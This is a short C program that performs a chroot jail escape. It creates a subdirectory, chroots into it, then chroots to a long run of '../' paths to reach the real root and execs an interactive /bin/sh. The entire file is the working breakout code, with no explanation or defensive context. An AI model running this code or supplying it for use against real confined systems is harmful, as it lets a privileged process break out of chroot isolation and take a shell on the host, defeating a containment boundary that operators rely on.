#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>

int main(){

	mkdir("foo", 0755);
	chroot("foo");
	chroot("../../../../../../../../../../../../../../../..");
	return execl("/bin/sh", "-i", NULL);
}